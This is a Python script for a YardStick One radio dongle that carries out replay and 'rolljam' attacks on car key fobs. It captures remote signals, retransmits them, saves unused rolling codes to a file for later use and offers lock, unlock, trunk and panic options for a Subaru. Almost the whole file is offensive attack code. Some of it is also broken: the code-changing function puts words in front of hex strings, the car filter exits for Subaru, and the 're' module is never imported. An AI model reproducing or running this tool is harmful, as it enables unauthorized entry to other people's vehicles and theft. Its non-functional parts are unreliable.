import argparse
import os
import sys
import time
import bitstring
from rflib import *
from struct import *

def main():
    parser = argparse.ArgumentParser(description="Replay and rolljam attacks against car key fobs with the yardstick one. Jammer for rolljam not included; check README.md for options and usage")
    parser.add_argument("functions", choices=['replay', 'rolljam'], help="Replay: Capture everything on a certain frequency and replay it upon pressing enter. | Rolljam: Capture codes and replay the first automatically. Saves remaining codes to use later, and for certain cars these can be altered (Use rolljam with -r or -t to save to/transmit from a file)")

    parser.add_argument("-b", "--baudrate", action="store", type=int, default="4800", help="Default=4800 | Set how quickly bits are read and transferred")
    parser.add_argument("-f", "--frequency", action="store", type=int, default="315000000", help="Default=315mhz | Set the frequency to receive and transmit on")
    parser.add_argument("-m", "--modulation", action="store", type=str, default="MOD_ASK_OOK", help="Default=ASK_OOK |  Set type of (de)modulation")
    parser.add_argument("-s", "--sleep", action="store", type=int, default="20", help="Default=20 | Changes how many codes are captured before being asked to continue")

    parser.add_argument("-c", "--car", action="store", type=str, help="Specify a supported car type for extra functionality. Can be used with --transmit. Use -c list to see all supported cars (rolljam)")
    parser.add_argument("-r", "--receive", action="store", type=str, help="Receive radio frequencies and log to file (rolljam)")
    parser.add_argument("-t", "--transmit", action="store", type=str, help="Transmit a code from a file. Can be used with --car to change the single code (rolljam)")
    args = parser.parse_args()

    if args.car=='list':
        list()
        exit(0)

    if args.functions=='replay':
        replay(args.frequency, args.baudrate, args.modulation, args.sleep)
        exit(0)

    if args.functions=='rolljam':
        #exits if attempt made to receive and transmit at same time
        if args.receive!=None and args.transmit!=None:
            print("You must choose between receiving or transmitting")
            exit(1)

        #records codes and writes to file, tells how many codes written
        elif args.receive!=None:
            #signal = "test\nlines\ngo\nbrrrr"
            signal = roll_receive(args.frequency, args.baudrate, args.modulation, args.sleep)
            with open(args.receive, "w") as f1:
                f1.write(signal)
                f1.close()
            print("Wrote "+str(len(open(args.receive).readlines()))+" codes to "+args.receive)
            exit(0)

        #transmits a code either for a specific car (user can change code then)
        #or just transmit next code in file (removes first line of file)
        elif args.transmit!=None:
            if not os.path.isfile(args.transmit):
                print("[-] File not found")
                exit(1)
            with open(args.transmit, "r") as f1:
                signal = f1.read()
                f1.close()
            codes = signal.split("\n")
            if len(codes)==0 or (len(codes)==1 and len(codes[0])==0):
                print("[-] No codes found in "+str(args.transmit))
                exit(1)
            if args.car!=None:
                codes = filter(args.car, codes)
                new_code = rolljam_car(args.car, codes[0])
                roll_transmit(args.frequency, args.baudrate, args.modulation, new_code)
            else:
                roll_transmit(args.frequency, args.baudrate, args.modulation, codes[0])
            updated_codes = []
            for c in codes[1:]:
                updated_codes.append(c)
            data=""
            for c in updated_codes:
                data += c+"\n"
            data = data.rstrip("\n")
            with open(args.transmit, "w") as r1:
                r1.write(data)
                r1.close()
            print("[+] Your file has "+str(len(updated_codes))+" codes left")
            exit(0)

        #go into rolljam looping function
        else:
            rolljam(args.frequency, args.baudrate, args.modulation, args.car, args.sleep)



def replay(frequency, baudrate, modulation, rsleep):
    #rfcat setup
    d = RfCat()
    d.setFreq(frequency)
    #not sure what type of var modulation needs to be, so here's a workaround
    if modulation=="MOD_2FSK":
        d.setMdmModulation(MOD_2FSK)
    else:
        d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(baudrate)
    d.setMaxPower()
    d.lowball()

    #function to receive codes
    slp=0
    i="y"
    signal=[]
    while i=="y":
        try:
            rfcode,t = d.RFrecv()
            hex_codes = rfcode.encode("hex")
            #print(hex_codes)
        except ChipconUsbTimeoutException:
            pass
        slp+=1
        signal.append(hex_codes)
        if slp==(rsleep/2):
            i=raw_input("Would you like to continue the capture? (y)es  (n)o ")
            slp=0
    codeline = ""
    for c in signal:
        codeline += c
    #print(codeline)
    codes = re.split("ffff*", codeline)

    #formatting
    for code in codes:
        #print(code)
        if len(code)%2 != 0:
            code = "0"+code
        raw_code = ""
        if len(code)>20:
            binary = bin(int(code,16))[2:]
            raw_code = bitstring.BitArray(bin=(binary)).tobytes()
        else:
            continue
        #transmitting
        print("[+] Sending code "+str(code))
        #d.makePktFLEN(250)
        d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*10)
        print("[+] Sent")


def rolljam(frequency, baudrate, modulation, car, rsleep):
    print("Start your jammer...")
    time.sleep(1)
    signal=roll_receive(frequency, baudrate, modulation, rsleep)
    print("[+] Received "+str(len(signal.splitlines()))+" codes")

    print("Stop jamming...")
    time.sleep(1)
    codes = signal.split("\n")
    roll_transmit(frequency, baudrate, modulation, codes[0])
    less_codes=[]
    for c in codes[1:]:
        less_codes.append(c)
    codes=less_codes
    i="i"
    while i!="e" and (len(codes)>0 or len(codes)==1 and len(codes[0]) is not 0):
        i = raw_input("\nYou have "+str(len(codes))+" codes left.\nWhat would you like to do? (t)ransmit  (e)xit: ")

        if i=="t":
            less_codes=[]
            if car is not None:
                codes = filter(car, codes)
                new_code = rolljam_car(car, codes[0])
                roll_transmit(frequency, baudrate, modulation, new_code)
            else:
                roll_transmit(frequency, baudrate, modulation, codes[0])
            for c in codes[1:]:
                less_codes.append(c)
            codes=less_codes

        elif i=="e":
            saving = raw_input("Would you like to save the remaining codes? (y)es  (n)o: ")
            if saving == ("y" or "yes"):
                filename = (raw_input("File name: "))
                data=""
                for c in codes:
                    data += c+"\n"
                data = data.rstrip("\n")
                with open(filename, "w") as f_end:
                    f_end.write(data)
                    f_end.close()
                print("[+] Saved "+filename+" with "+str(len(codes))+" codes")

    if len(codes)==0:
        if len(codes)==1:
            if len(codes[0])==0:
                print("[-] Last code was empty")
        else:
            print("[-] Ran out of codes")
    else:
        print("Exiting")
    exit(0)


#receives til user hits enter, then sorts codes out separated by newlines
def roll_receive(frequency, baudrate, modulation, rsleep):
    #rfcat setup
    d = RfCat()
    d.setFreq(frequency)
    #not sure what type of var modulation needs to be, so here's a workaround
    if modulation=="MOD_2FSK":
        d.setMdmModulation(MOD_2FSK)
    else:
        d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(baudrate)
    d.setMaxPower()
    d.lowball()

    #function to receive codes
    slp=0
    i="y"
    signal=[]
    while i=="y":
        try:
            rfcode,t = d.RFrecv()
            hex_codes = rfcode.encode("hex")
            #print(hex_codes)
        except ChipconUsbTimeoutException:
            pass
        slp+=1
        signal.append(hex_codes)
        if slp==(rsleep/2):
            i=raw_input("Would you like to continue the capture? (y)es  (n)o ")
            slp=0
    codeline = ""
    for c in signal:
        codeline += c
    #print(codeline)
    codes = re.split("ffff*", codeline)

    #formatting
    for code in codes:
        if len(code)%2 != 0:
            code = "0"+code
        raw_code = ""
        signal_list=[]
        if len(code)>20:  #may need changed if smaller codes found
            signal_list.append(code)
        signal = "\n".join(signal_list)
    d.cleanup()
    if len(signal)==0:
        print("[-] Received 0 codes")
        exit(1)
    return signal  #(separate found codes by line) DO NOT SPLIT. just have \n's


#transmits one code
def roll_transmit(frequency, baudrate, modulation, code):
    #rfcat setup
    d = RfCat()
    d.setFreq(frequency)
    #not sure what type of var modulation needs to be, so here's a workaround
    if modulation=="MOD_2FSK":
        d.setMdmModulation(MOD_2FSK)
    else:
        d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(baudrate)
    d.setMaxPower()
    d.lowball()

    #formatting
    binary = bin(int(code,16))[2:]
    raw_code = bitstring.BitArray(bin=(binary)).tobytes()
    #transmitting
    print("[+] Sending code "+str(code))
    #d.makePktFLEN(250)
    d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*10)
    print("[+] Sent")
    d.cleanup()


#prints list of supported cars
def list():
    print("Car List: \nSubaru - tested on 2010 subaru impreza")


#edits code sent to function to change it's functionality
#may have to convert hex to bin and back to hex
def rolljam_car(car, code):
    c = raw_input("Would you like to: open (t)runk, (p)anic alarm, (l)ock, (u)nlock: ")
    if car=="subaru":
        if c=="l":
            prefix="lock"
            #code=code.parse_out_prefix
            new_code = prefix+code
        elif c=="u":
            prefix="unlock"
            #code=code.parse_out_prefix
            new_code = prefix+code
        elif c=="t":
            prefix="trunk"
            #code=code.parse_out_prefix
            new_code = prefix+code
        elif c=="p":
            prefix="panic"
            #code=code.parse_out_prefix
            new_code = prefix+code
    else:
        print("[-] Changing codes not supported")
        return code
    if c!="l" and c!="u" and c!="t" and c!="p":
        print("[-] Unknown command, code will remain unchanged.")
        return code
    print("[+] Code changed for ",car)
    return new_code


#filter out any codes in a list not pertaining to the specified car
def filter(car, codes):
    filtered_codes=[]
    if car=="subaru":
        print("Filtering codes for "+car)
        for c in codes:
            #if passes regex:  prob convert to bin first, then compare, then hex
                filtered_codes.append(c)

    if car=="camaro":
        print("Filtering codes for "+car)
        for c in codes:
            #if check for prefix with regex. prob convert to bin compare, then hex
                filtered_codes.append(c)

    else:
        print("[-] Car not supported")
        exit(1)

    if len(filtered_codes)==0:
        print("[-] No codes found")
        exit(1)
    return filtered_codes



if __name__ == "__main__":
    main()
